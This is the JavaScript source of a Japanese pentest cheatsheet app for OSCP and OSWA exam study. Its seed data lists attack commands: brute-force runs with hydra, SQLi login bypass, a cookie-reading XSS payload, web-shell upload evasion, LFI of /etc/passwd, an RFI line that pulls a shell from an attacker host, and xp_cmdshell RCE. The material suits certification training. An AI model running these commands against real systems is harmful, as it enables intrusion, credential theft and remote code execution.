/* ═══════════════════════════════════════════════════════
   go2 cheatsheet — methodology.js  (攻略メソドロジー)
   Data: data.methodologies[]
   methodology { id,title,cert, sections[] }
     section { id,label,trigger, steps[] }
       step { id,label,command,hint,next }

   「判明した事実 → 次の一手」を線形チェックリストで引く。
   資格タブ(OSCP=ポート軸 / OSWA=状況軸)で切替。
   プレースホルダ(<IP>等)をその場で一括置換。チェックはセッション参照用。

   app.js の共通関数（openModal/toast/esc/uid/copyToClipboard/val）と
   state（methCert/methPlaceholders/methChecked/methOpenSections）を再利用。
════════════════════════════════════════════════════════ */

function methForCert() {
  return data.methodologies.filter(m => m.cert === methCert);
}

/* プレースホルダ (<IP> 等) を検出 */
function methExtractPlaceholders() {
  const set = new Set();
  methForCert().forEach(m => m.sections.forEach(s => s.steps.forEach(st => {
    (st.command.match(/<[^>]+>/g) || []).forEach(p => set.add(p));
  })));
  return [...set];
}
/* コマンド内のプレースホルダを置換値で埋める */
function methApplyPlaceholders(cmd) {
  let out = cmd;
  Object.keys(methPlaceholders).forEach(ph => {
    if (methPlaceholders[ph]) out = out.split(ph).join(methPlaceholders[ph]);
  });
  return out;
}

function renderMethNav() {
  const nav = document.getElementById("navList");
  if (!nav) return;
  nav.innerHTML = `
    <button class="nav-item active" onclick="setMode('methodology')">
      <span class="material-symbols-rounded nav-icon">account_tree</span>
      <span class="nav-label">メソドロジー</span>
      <span class="nav-count">${data.methodologies.length}</span>
    </button>`;
}

/* ═══════════════════════════════════════════════════
   一覧（資格タブ＋アコーディオン）
════════════════════════════════════════════════════ */
function renderMethodology() {
  methodologySeedIfEmpty();
  renderMethNav();
  const main = document.getElementById("main");

  const certs = [...new Set(data.methodologies.map(m=>m.cert))];
  if (!certs.includes(methCert)) methCert = certs[0] || "OSCP";

  const list = methForCert();
  const totalSteps = list.reduce((a,m)=>a+m.sections.reduce((b,s)=>b+s.steps.length,0),0);
  const doneSteps = list.reduce((a,m)=>a+m.sections.reduce((b,s)=>b+s.steps.filter(st=>methChecked[st.id]).length,0),0);

  // 資格タブ
  const certTab = (id) => {
    const n = data.methodologies.filter(m=>m.cert===id).reduce((a,m)=>a+m.sections.length,0);
    return `<button class="tool-cert-tab ${methCert===id?'on':''}" onclick="mSetCert('${escAttr(id)}')">${esc(id)} <span class="badge">${n}節</span><span class="meth-cert-del" onclick="event.stopPropagation();mDelCert('${escAttr(id)}')" title="この資格タブを削除"><span class="material-symbols-rounded" style="font-size:13px">close</span></span></button>`;
  };
  const certTabs = certs.map(certTab).join("")
    + `<button class="tool-cert-tab meth-cert-add" onclick="mAddCert()" title="資格タブを追加"><span class="material-symbols-rounded" style="font-size:16px">add</span></button>`;

  // プレースホルダ置換バー
  const phs = methExtractPlaceholders();
  const phBar = phs.length ? `
    <div class="meth-ph-bar">
      <span class="meth-ph-label"><span class="material-symbols-rounded" style="font-size:15px">find_replace</span>置換</span>
      ${phs.map(ph=>`<span class="meth-ph-input"><code>${esc(ph)}</code><input type="text" value="${esc(methPlaceholders[ph]||"")}" placeholder="値" oninput="mSetPh('${esc(ph)}',this.value)"></span>`).join("")}
    </div>` : "";

  // セクション（アコーディオン）
  const sections = [];
  list.forEach(m => {
    m.sections.forEach((s, si, sarr) => {
      const done = s.steps.filter(st=>methChecked[st.id]).length;
      const open = methOpenSections[s.id];
      const stepsHtml = open ? s.steps.map((st,sti,starr) => renderMethStep(st, m.id, s.id, sti, starr.length)).join("") : "";
      sections.push(`
        <div class="meth-section ${open?'open':''}">
          <button class="meth-section-head" onclick="mToggleSection('${s.id}')">
            <span class="material-symbols-rounded meth-chevron">${open?'expand_more':'chevron_right'}</span>
            <span class="meth-section-label">${esc(s.label)}</span>
            ${s.trigger?`<span class="meth-section-trigger">${esc(s.trigger)}</span>`:""}
            <span class="meth-section-prog ${done===s.steps.length&&done>0?'complete':''}">${done}/${s.steps.length}</span>
            <span class="meth-section-move" onclick="event.stopPropagation();mMoveSection('${m.id}','${s.id}',-1)" title="節を上へ" ${si===0?'style="opacity:.3;pointer-events:none"':''}><span class="material-symbols-rounded" style="font-size:15px">arrow_upward</span></span>
            <span class="meth-section-move" onclick="event.stopPropagation();mMoveSection('${m.id}','${s.id}',1)" title="節を下へ" ${si===sarr.length-1?'style="opacity:.3;pointer-events:none"':''}><span class="material-symbols-rounded" style="font-size:15px">arrow_downward</span></span>
            <span class="meth-section-edit" onclick="event.stopPropagation();mEditSection('${s.id}')" title="節を編集"><span class="material-symbols-rounded" style="font-size:15px">edit</span></span>
          </button>
          ${open?`<div class="meth-section-body">${stepsHtml}
            <button class="meth-add-step" onclick="mAddStep('${s.id}')"><span class="material-symbols-rounded" style="font-size:15px">add</span>手法を追加</button>
          </div>`:""}
        </div>`);
    });
  });

  main.innerHTML = `
    <div class="s-head">
      <h1>メソドロジー</h1>
      <span class="th-count">${methCert} · ${list.reduce((a,m)=>a+m.sections.length,0)}節 · ${doneSteps}/${totalSteps} 完了</span>
      <button class="th-add" onclick="mAddSection()"><span class="material-symbols-rounded">add</span>節を追加</button>
    </div>
    <div class="tool-cert-tabs">${certTabs}</div>
    ${phBar}
    <div class="meth-toolbar">
      <button class="meth-tool-btn" onclick="mExpandAll(true)"><span class="material-symbols-rounded" style="font-size:15px">unfold_more</span>すべて開く</button>
      <button class="meth-tool-btn" onclick="mExpandAll(false)"><span class="material-symbols-rounded" style="font-size:15px">unfold_less</span>すべて閉じる</button>
      <button class="meth-tool-btn" onclick="mResetChecks()"><span class="material-symbols-rounded" style="font-size:15px">restart_alt</span>チェックをリセット</button>
      <button class="meth-tool-btn" onclick="mImportJson()"><span class="material-symbols-rounded" style="font-size:15px">upload_file</span>JSONで取り込み</button>
    </div>
    ${sections.length ? `<div class="meth-sections">${sections.join("")}</div>`
      : emptyState("account_tree", "この資格のメソドロジーがまだありません", "「節を追加」で作成できます")}
  `;
}

function renderMethStep(st, mId, sId, idx, total) {
  const checked = !!methChecked[st.id];
  const cmd = methApplyPlaceholders(st.command);
  const hasPh = st.command !== cmd;  // 置換が起きたか
  const canMove = (mId !== undefined && total !== undefined);
  const moveBtns = canMove ? `
            <button class="meth-step-act" onclick="mMoveStep('${mId}','${sId}',${idx},-1)" title="上へ" ${idx===0?'disabled':''}><span class="material-symbols-rounded" style="font-size:13px">arrow_upward</span></button>
            <button class="meth-step-act" onclick="mMoveStep('${mId}','${sId}',${idx},1)" title="下へ" ${idx===total-1?'disabled':''}><span class="material-symbols-rounded" style="font-size:13px">arrow_downward</span></button>` : "";
  return `
    <div class="meth-step ${checked?'checked':''}">
      <button class="meth-check" onclick="mToggleCheck('${st.id}')" title="チェック">
        <span class="material-symbols-rounded">${checked?'check_box':'check_box_outline_blank'}</span>
      </button>
      <div class="meth-step-body">
        <div class="meth-step-label">${esc(st.label)}
          <span class="meth-step-acts">${moveBtns}
            <button class="meth-step-act" onclick="mEditStep('${st.id}')" title="編集"><span class="material-symbols-rounded" style="font-size:13px">edit</span></button>
            <button class="meth-step-act danger" onclick="mDelStep('${st.id}')" title="削除"><span class="material-symbols-rounded" style="font-size:13px">delete</span></button>
          </span>
        </div>
        ${st.command?`<pre class="meth-cmd ${hasPh?'resolved':''}" data-stepid="${st.id}" data-rawcmd="${escAttr(st.command)}"><span class="meth-cmd-text">${esc(cmd)}</span><button class="tool-cmd-copy" onclick="event.stopPropagation();copyToClipboard(${escAttr(JSON.stringify(cmd))});toast('📋 コピーしました')" title="コピー"><span class="material-symbols-rounded" style="font-size:14px">content_copy</span></button></pre>`:""}
        ${st.hint?`<div class="meth-hint"><span class="material-symbols-rounded" style="font-size:13px">lightbulb</span>${esc(st.hint)}</div>`:""}
        ${st.next?`<div class="meth-next"><span class="material-symbols-rounded" style="font-size:13px">arrow_forward</span>${esc(st.next)}</div>`:""}
      </div>
    </div>`;
}

/* 操作 */
function mSetCert(c){ methCert=c; renderMethodology(); }

/* 資格タブの追加・削除 */
function mAddCert() {
  openModal("資格タブを追加",
    `<label>資格・カテゴリ名</label><input id="mNewCert" placeholder="例: OSEP / OSWE / PNPT / 汎用">
     <div class="meth-import-hint">新しい資格タブを作成し、空のメソドロジーを用意します。作成後「節を追加」または「JSONで取り込み」で中身を追加できます。</div>`,
    () => {
      const name = val("mNewCert").trim();
      if (!name) { toast("名前を入力してください"); return; }
      if (data.methodologies.some(m=>m.cert===name)) {
        methCert = name; renderMethodology();
        toast(`「${name}」タブに切り替えました（既に存在します）`);
        return;
      }
      data.methodologies.push({ id: uid(), title: `${name} Methodology`, cert: name, sections: [], ts: Date.now() });
      methCert = name;
      renderMethodology();
      toast(`✅ 資格タブ「${name}」を追加しました`);
    },
    { okText: "追加" });
}

function mDelCert(cert) {
  const secCount = data.methodologies.filter(m=>m.cert===cert).reduce((a,m)=>a+m.sections.length,0);
  if (!confirm(`資格タブ「${cert}」を削除しますか？\n配下の ${secCount} 節がすべて削除されます。`)) return;
  data.methodologies = data.methodologies.filter(m=>m.cert!==cert);
  // 開いていたタブを削除したら別のタブへ退避
  const remaining = [...new Set(data.methodologies.map(m=>m.cert))];
  if (methCert === cert) methCert = remaining[0] || "OSCP";
  renderMethodology();
  toast(`🗑 資格タブ「${cert}」を削除しました`);
}
function mSetPh(ph,v){
  methPlaceholders[ph]=v;
  // 全体再描画するとフォーカスが外れる（1文字ずつ問題）ので、
  // 表示中のコマンドテキストとコピーボタンだけを直接更新する
  document.querySelectorAll(".meth-cmd").forEach(pre => {
    const raw = pre.getAttribute("data-rawcmd") || "";
    const resolved = methApplyPlaceholders(raw);
    const textEl = pre.querySelector(".meth-cmd-text");
    if (textEl) textEl.textContent = resolved;
    pre.classList.toggle("resolved", resolved !== raw);
    const copyBtn = pre.querySelector(".tool-cmd-copy");
    if (copyBtn) copyBtn.setAttribute("onclick",
      `event.stopPropagation();copyToClipboard(${escAttr(JSON.stringify(resolved))});toast('📋 コピーしました')`);
  });
}
function mToggleSection(id){ methOpenSections[id]=!methOpenSections[id]; renderMethodology(); }
function mToggleCheck(id){ methChecked[id]=!methChecked[id]; renderMethodology(); }
function mExpandAll(open){
  methForCert().forEach(m=>m.sections.forEach(s=>{ methOpenSections[s.id]=open; }));
  renderMethodology();
}
function mResetChecks(){
  if(!confirm("チェックを全てリセットしますか？")) return;
  methChecked={}; renderMethodology(); toast("チェックをリセットしました");
}

/* JSON一括取り込み（節・手法をまとめて追加） */
function mImportJson() {
  openModal("JSONで取り込み",
    `<div class="know-paste-zone">
       <label style="display:flex;align-items:center;gap:8px">
         <span class="material-symbols-rounded" style="font-size:16px;color:var(--md-primary)">content_paste</span>
         Claudeが作った節データのJSONを貼り付け
       </label>
       <textarea id="mImportText" class="mono-input" placeholder='{"cert":"OSWA","sections":[{"label":"...","trigger":"...","steps":[{"label":"...","command":"...","hint":"...","next":"..."}]}]}' style="min-height:160px"></textarea>
     </div>
     <div class="meth-import-opt">
       <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
         <input type="checkbox" id="mImportMerge" checked>
         同名の節があれば手法を追記（オフなら別の節として追加）
       </label>
     </div>
     <div class="meth-import-hint">現在の資格タブ「${methCert}」に取り込まれます（JSONのcertが優先）</div>`,
    () => {
      const raw = val("mImportText").trim();
      if (!raw) { toast("JSONを貼り付けてください"); return; }
      let obj;
      try { obj = JSON.parse(raw); }
      catch(e) { toast("⚠ JSONの形式が正しくありません"); return; }
      const cert = obj.cert || methCert;
      const sections = Array.isArray(obj.sections) ? obj.sections : (Array.isArray(obj) ? obj : null);
      if (!sections) { toast("⚠ sections配列が見つかりません"); return; }
      const merge = document.getElementById("mImportMerge")?.checked;

      // 対象のmethodology（資格）を取得 or 作成
      let m = data.methodologies.find(x=>x.cert===cert);
      if (!m) { m = { id: uid(), title: `${cert} Methodology`, cert, sections: [], ts: Date.now() }; data.methodologies.push(m); }

      let addedSec=0, addedStep=0;
      sections.forEach(sec => {
        const steps = (Array.isArray(sec.steps)?sec.steps:[]).map(st=>({
          id: uid(), label: st.label||"", command: st.command||"", hint: st.hint||"", next: st.next||""
        }));
        const existing = merge ? m.sections.find(s=>s.label===sec.label) : null;
        if (existing) {
          existing.steps.push(...steps); addedStep+=steps.length;
        } else {
          const sid = uid();
          m.sections.push({ id: sid, label: sec.label||"新しい節", trigger: sec.trigger||"", steps });
          methOpenSections[sid]=false;
          addedSec++; addedStep+=steps.length;
        }
      });
      methCert = cert;
      renderMethodology();
      toast(`✅ ${addedSec}節・${addedStep}手法を取り込みました`);
    },
    { okText: "取り込む" });
}

/* 節の追加・編集 */
function mAddSection() {
  let m = methForCert()[0];
  openModal("節を追加",
    `<label>ラベル（入口）</label><input id="msLabel" placeholder="${methCert==='OSCP'?'例: Port 445 (SMB)':'例: ログインフォームがある'}">
     <label>トリガー（いつ見るか・任意）</label><input id="msTrigger" placeholder="${methCert==='OSCP'?'445が開いている':'ログイン画面を見つけた'}">`,
    () => {
      if (!m) {
        m = { id: uid(), title: `${methCert} Methodology`, cert: methCert, sections: [], ts: Date.now() };
        data.methodologies.push(m);
      }
      const sid = uid();
      m.sections.push({ id: sid, label: val("msLabel")||"新しい節", trigger: val("msTrigger"), steps: [] });
      methOpenSections[sid] = true;
      renderMethodology(); toast("✅ 節を追加しました");
    });
}
function mFindSection(sid) {
  for (const m of data.methodologies) { const s = m.sections.find(x=>x.id===sid); if (s) return {m,s}; }
  return null;
}
function mFindStep(stepId) {
  for (const m of data.methodologies) for (const s of m.sections) { const st = s.steps.find(x=>x.id===stepId); if (st) return {m,s,st}; }
  return null;
}

/* 節の並び替え */
function mMoveSection(mId, sId, dir) {
  const m = data.methodologies.find(x=>x.id===mId); if (!m) return;
  const i = m.sections.findIndex(s=>s.id===sId); if (i<0) return;
  const j = i + dir;
  if (j < 0 || j >= m.sections.length) return;
  [m.sections[i], m.sections[j]] = [m.sections[j], m.sections[i]];
  renderMethodology();
}
/* 手法の並び替え */
function mMoveStep(mId, sId, idx, dir) {
  const m = data.methodologies.find(x=>x.id===mId); if (!m) return;
  const s = m.sections.find(x=>x.id===sId); if (!s) return;
  const j = idx + dir;
  if (j < 0 || j >= s.steps.length) return;
  [s.steps[idx], s.steps[j]] = [s.steps[j], s.steps[idx]];
  renderMethodology();
}

function mEditSection(sid) {
  const f = mFindSection(sid); if (!f) return;
  openModal("節を編集",
    `<label>ラベル</label><input id="msLabel" value="${esc(f.s.label)}">
     <label>トリガー</label><input id="msTrigger" value="${esc(f.s.trigger)}">`,
    () => { f.s.label=val("msLabel")||"新しい節"; f.s.trigger=val("msTrigger"); renderMethodology(); toast("✅ 更新しました"); },
    { extraBtns: [{ label:"節を削除", cls:"btn-text btn-danger", fn:()=>{ closeModal(); mDelSection(sid); } }] });
}
function mDelSection(sid) {
  const f = mFindSection(sid); if (!f) return;
  if (!confirm(`節「${f.s.label}」を削除しますか？`)) return;
  f.m.sections = f.m.sections.filter(x=>x.id!==sid);
  renderMethodology(); toast("🗑 削除しました");
}

/* ステップ（手法）の追加・編集 */
function mAddStep(sid) {
  const f = mFindSection(sid); if (!f) return;
  openModal("手法を追加",
    `<label>手法名</label><input id="mtLabel" placeholder="例: Enum4linux">
     <label>コマンド（&lt;IP&gt; 等のプレースホルダOK）</label><textarea id="mtCmd" placeholder="enum4linux -a <IP>"></textarea>
     <label>条件ヒント（いつ効くか・任意）</label><input id="mtHint" placeholder="匿名アクセスが有効な時">
     <label>次の手（成功したら・任意）</label><input id="mtNext" placeholder="共有が見えたら smbclient で接続">`,
    () => {
      f.s.steps.push({ id: uid(), label: val("mtLabel")||"新しい手法", command: val("mtCmd"), hint: val("mtHint"), next: val("mtNext") });
      renderMethodology(); toast("✅ 手法を追加しました");
    });
}
function mEditStep(stepId) {
  const f = mFindStep(stepId); if (!f) return;
  openModal("手法を編集",
    `<label>手法名</label><input id="mtLabel" value="${esc(f.st.label)}">
     <label>コマンド</label><textarea id="mtCmd">${esc(f.st.command)}</textarea>
     <label>条件ヒント</label><input id="mtHint" value="${esc(f.st.hint)}">
     <label>次の手</label><input id="mtNext" value="${esc(f.st.next)}">`,
    () => {
      f.st.label=val("mtLabel")||"新しい手法"; f.st.command=val("mtCmd");
      f.st.hint=val("mtHint"); f.st.next=val("mtNext");
      renderMethodology(); toast("✅ 更新しました");
    },
    { extraBtns: [{ label:"削除", cls:"btn-text btn-danger", fn:()=>{ closeModal(); mDelStep(stepId); } }] });
}
function mDelStep(stepId) {
  const f = mFindStep(stepId); if (!f) return;
  if (!confirm(`手法「${f.st.label}」を削除しますか？`)) return;
  f.s.steps = f.s.steps.filter(x=>x.id!==stepId);
  renderMethodology(); toast("🗑 削除しました");
}

/* 節ヘッダに手法追加ボタンを出すため、セクションbody末尾に追加ボタンを差し込む */
/* （renderMethStepのループ後、renderMethodologyで各section bodyに付与） */

/* 検索 */
function renderMethodologySearch() {
  const main = document.getElementById("main");
  const q = document.getElementById("searchInput").value.trim().toLowerCase();
  if (!q) { searchMode=false; render(); return; }
  renderMethNav();
  const hits = [];
  data.methodologies.forEach(m => m.sections.forEach(s => {
    const secMatch = (s.label+" "+s.trigger).toLowerCase().includes(q);
    const matchSteps = s.steps.filter(st =>
      (st.label+" "+st.command+" "+st.hint+" "+st.next).toLowerCase().includes(q));
    if (secMatch || matchSteps.length) {
      hits.push({ m, s, steps: secMatch ? s.steps : matchSteps });
    }
  }));
  main.innerHTML = `
    <div class="s-head"><h1>検索: ${esc(q)}</h1><span class="th-count">${hits.length} 節ヒット</span></div>
    ${hits.length ? `<div class="meth-sections">${hits.map(h=>`
      <div class="meth-section open">
        <div class="meth-section-head" style="cursor:default">
          <span class="meth-cert-badge">${esc(h.m.cert)}</span>
          <span class="meth-section-label">${esc(h.s.label)}</span>
        </div>
        <div class="meth-section-body">${h.steps.map(st=>renderMethStep(st)).join("")}</div>
      </div>`).join("")}</div>`
      : emptyState("search_off","一致する手法がありません","別のキーワードをお試しください")}
  `;
}

/* ═══════════════════════════════════════════════════
   初期データ（OSCP=ポート軸 / OSWA=状況軸）
════════════════════════════════════════════════════ */
function methodologySeedIfEmpty() {
  if (data.methodologies.length || window.__methSeeded) return;
  window.__methSeeded = true;

  const S = (label, trigger, steps) => ({ id: uid(), label, trigger, steps: steps.map(st=>({id:uid(),...st})) });

  // ── OSCP: ポート/サービス軸 ──
  const oscp = {
    id: uid(), title: "OSCP ポート別メソドロジー", cert: "OSCP", ts: Date.now(),
    sections: [
      S("Recon (全体)", "スキャン開始時", [
        { label: "全ポート高速スキャン", command: "nmap -p- --min-rate 10000 -T4 <IP> -oN nmap-allports.txt", hint: "まず開いてるポートを素早く把握", next: "見つかったポートに -sC -sV で詳細スキャン" },
        { label: "詳細スキャン", command: "nmap -sC -sV -p <PORTS> <IP> -oN nmap-detail.txt", hint: "<PORTS>に上の結果を入れる", next: "各ポートの節へ" },
        { label: "UDP上位スキャン", command: "sudo nmap -sU --top-ports 100 <IP>", hint: "TCPで手詰まりの時", next: "" },
      ]),
      S("21 / FTP", "21が開いている", [
        { label: "匿名ログイン", command: "ftp <IP>\n# user: anonymous / pass: anonymous", hint: "まず必ず試す", next: "入れたら get で全ファイル取得" },
        { label: "バージョン確認 → exploit検索", command: "searchsploit <ftpソフト名 バージョン>", hint: "vsftpd 2.3.4 等は既知の脆弱性あり", next: "該当あればexploit実行" },
        { label: "ブルートフォース", command: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP>", hint: "匿名不可・ユーザ名候補がある時", next: "" },
      ]),
      S("22 / SSH", "22が開いている", [
        { label: "バージョン確認", command: "nc <IP> 22", hint: "古いOpenSSHは列挙脆弱性あり", next: "" },
        { label: "ブルートフォース", command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>", hint: "認証情報の候補がある時のみ（時間かかる）", next: "" },
        { label: "鍵ファイルでログイン", command: "chmod 600 id_rsa\nssh -i id_rsa <user>@<IP>", hint: "他ポートからid_rsaを入手した時", next: "" },
      ]),
      S("80 / 443 HTTP(S)", "80/443が開いている", [
        { label: "ディレクトリ探索", command: "feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", hint: "隠しパスを探す", next: "見つけたパスを個別に調査" },
        { label: "技術スタック特定", command: "whatweb http://<IP>\n# または nikto -h http://<IP>", hint: "CMS/フレームワークを特定", next: "WordPressならwpscan、等" },
        { label: "vhost / サブドメイン", command: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<IP> -H \"Host: FUZZ.<DOMAIN>\" -fs <SIZE>", hint: "ドメイン名が判明している時", next: "見つかったvhostを /etc/hosts に追加" },
        { label: "既知CMSの脆弱性", command: "wpscan --url http://<IP> --enumerate u,vp", hint: "WordPress検出時", next: "ユーザ列挙→パスワード総当り" },
      ]),
      S("139 / 445 SMB", "139/445が開いている", [
        { label: "列挙 (enum4linux)", command: "enum4linux -a <IP>", hint: "共有・ユーザ・ポリシーを一括列挙", next: "共有が見えたらsmbclientで接続" },
        { label: "共有一覧", command: "smbclient -L //<IP>/ -N", hint: "-N は匿名（null session）", next: "アクセスできる共有にsmbclientで入る" },
        { label: "共有に接続", command: "smbclient //<IP>/<SHARE> -N", hint: "興味深い共有名を見つけたら", next: "get でファイル取得、認証情報を探す" },
        { label: "既知脆弱性チェック", command: "nmap --script smb-vuln* -p 139,445 <IP>", hint: "EternalBlue(MS17-010)等", next: "該当あればexploit" },
      ]),
      S("3306 / MySQL", "3306が開いている", [
        { label: "接続試行", command: "mysql -h <IP> -u root -p", hint: "空パスワード・root/rootを試す", next: "入れたらDB列挙" },
        { label: "認証情報で接続", command: "mysql -h <IP> -u <user> -p<pass>", hint: "他所で認証情報を入手した時", next: "" },
      ]),
      S("1433 / MSSQL", "1433が開いている", [
        { label: "接続 (impacket)", command: "impacket-mssqlclient <user>:<pass>@<IP> -windows-auth", hint: "認証情報がある時", next: "xp_cmdshell でRCEを狙う" },
        { label: "xp_cmdshell 有効化 → RCE", command: "enable_xp_cmdshell\nxp_cmdshell whoami", hint: "sysadmin権限がある時", next: "リバースシェル取得へ" },
      ]),
      S("シェル取得後 (Priv Esc)", "リバースシェルを取得した", [
        { label: "自動列挙 (Linux)", command: "./linpeas.sh | tee linpeas.txt", hint: "権限昇格の糸口を自動列挙", next: "赤/黄ハイライトを上から調査" },
        { label: "自動列挙 (Windows)", command: ".\\winPEAS.exe", hint: "Windows版", next: "" },
        { label: "SUID確認 (Linux)", command: "find / -perm -4000 -type f 2>/dev/null", hint: "GTFOBinsに載ってれば昇格可", next: "GTFOBins で該当バイナリを検索" },
        { label: "sudo権限確認", command: "sudo -l", hint: "パスワード無しで実行できるものは狙い目", next: "GTFOBins で sudo 悪用を検索" },
      ]),
    ],
  };

  // ── OSWA: 状況/脆弱性タイプ軸 ──
  const oswa = {
    id: uid(), title: "OSWA 状況別メソドロジー", cert: "OSWA", ts: Date.now(),
    sections: [
      S("初期偵察 (Webターゲット)", "Webアプリを与えられた", [
        { label: "技術スタック特定", command: "whatweb http://<TARGET>", hint: "言語・FW・サーバを把握", next: "スタックに応じた脆弱性を優先" },
        { label: "ディレクトリ探索", command: "feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", hint: "隠し機能・管理画面を探す", next: "見つけた機能ごとに下の節へ" },
        { label: "Burpでプロキシ", command: "# Burp を起動し、全リクエストを観察", hint: "全ての通信を記録", next: "気になるパラメータをRepeaterへ" },
      ]),
      S("ログインフォームがある", "ログイン画面を発見", [
        { label: "SQLi 認証バイパス", command: "' OR '1'='1'-- -", hint: "ユーザ名/パスワード欄に投入", next: "入れたら管理者としてログイン" },
        { label: "デフォルト認証情報", command: "# admin:admin / admin:password / root:root", hint: "まず試す", next: "" },
        { label: "ユーザ名列挙", command: "# エラーメッセージの差異を観察（存在するuserと無いuser）", hint: "「パスワードが違う」vs「ユーザが無い」", next: "列挙できたらブルートフォース" },
        { label: "ブルートフォース (ffuf)", command: "ffuf -w passwords.txt -X POST -d \"username=admin&password=FUZZ\" -u http://<TARGET>/login -fc 200", hint: "CeWLでサイト固有語のリストを作ると効く", next: "" },
      ]),
      S("?id= 等のパラメータがある", "URLにパラメータを発見", [
        { label: "SQLi 検出", command: "# 値の後ろに ' を付けてエラーを観察\nhttp://<TARGET>/page?id=1'", hint: "SQLエラーが出れば脆弱の可能性", next: "UNION/error-basedで抽出へ" },
        { label: "UNION カラム数特定", command: "http://<TARGET>/page?id=1' ORDER BY 1-- -", hint: "エラーが出るまで数を増やす", next: "カラム数が分かったらUNION SELECT" },
        { label: "sqlmap で自動化", command: "sqlmap -u \"http://<TARGET>/page?id=1\" --batch --dbs", hint: "手動で当たりを付けてから確認に使う", next: "dbs→tables→dump" },
        { label: "IDOR チェック", command: "# id=1 → id=2 と変えて他人のデータが見えるか", hint: "認可の不備", next: "" },
      ]),
      S("検索・入力フォームがある", "テキスト入力欄を発見", [
        { label: "XSS 検出", command: "<script>alert(1)</script>", hint: "反射されるか確認", next: "フィルタされたら img onerror 等で回避" },
        { label: "XSS 回避", command: "<img src=x onerror=alert(document.cookie)>", hint: "scriptタグが弾かれる時", next: "Cookie窃取のPoCへ" },
        { label: "SSTI 検出", command: "${7*7}  {{7*7}}", hint: "49 が返ればテンプレートインジェクション", next: "Template Injection Tableでエンジン特定" },
      ]),
      S("ファイルアップロード機能がある", "アップロード欄を発見", [
        { label: "Webシェルアップロード", command: "# shell.php を拡張子偽装してアップ\nshell.php / shell.php.jpg / shell.phtml", hint: "拡張子フィルタを回避", next: "アップ先URLにアクセスしてRCE" },
        { label: "Content-Type 偽装", command: "# Burpで Content-Type: image/png に書き換え", hint: "MIME検証を回避", next: "" },
        { label: "マジックバイト付与", command: "# ファイル先頭に GIF89a; を付けてPHPを続ける", hint: "画像判定を回避", next: "" },
      ]),
      S("ファイルを読み込むパラメータ", "?file= ?page= 等を発見", [
        { label: "LFI 検出", command: "http://<TARGET>/?page=../../../../etc/passwd", hint: "パストラバーサル", next: "読めたらログ汚染→RCEも狙う" },
        { label: "PHP filter でソース抽出", command: "php://filter/convert.base64-encode/resource=index", hint: "拡張子が付与される時", next: "ソースから認証情報・別の脆弱性を発見" },
        { label: "RFI チェック", command: "http://<TARGET>/?page=http://<ATTACKER>/shell.txt", hint: "外部URLが読み込めるなら", next: "リモートシェル" },
      ]),
    ],
  };

  data.methodologies.push(oscp, oswa);
}
